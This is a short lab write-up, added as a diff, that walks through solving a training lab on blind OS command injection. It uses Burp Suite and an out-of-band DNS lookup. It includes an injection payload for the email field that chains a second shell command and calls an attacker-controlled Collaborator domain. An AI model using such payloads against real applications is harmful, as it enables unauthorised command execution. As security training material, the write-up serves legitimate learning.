@@ -1,0 +1,30 @@
+Lab: Blind OS command injection with out-of-band interaction
+Difficulty: Practitioner
+
+What’s going on here? The feedback feature is vulnerable to blind OS command injection. The catch is that the app runs your command asynchronously and doesn’t show any output back to you, so you can’t just see the results directly or redirect output to a file you can access.
+
+But there’s a way: the app executes shell commands, so you can trigger an out-of-band interaction—like a DNS lookup to an external server you control.
+
+How I solved it:
+
+Fire up Burp Suite and intercept the feedback request.
+
+Look for the email parameter, since it’s used unsafely in a shell command.
+
+Modify the email value to something like this:
+
+x||nslookup x.BURP-COLLABORATOR-SUBDOMAIN||
+The || is a shell OR operator that lets you run an extra command after the normal one.
+
+Right-click on the part where you want to add the Burp Collaborator domain, and select Insert Collaborator payload so Burp auto-generates a unique subdomain for you.
+
+Send the request.
+
+Wait and watch your Burp Collaborator tab for any incoming DNS lookup from the server. When it shows up, you know your injection worked.
+
+Why this works:
+
+The app runs the command but doesn’t show output, so you can’t just get it back in the app.
+
+But the server does try to do the DNS lookup from inside your injected command, hitting your Burp Collaborator server, which you can monitor.
+
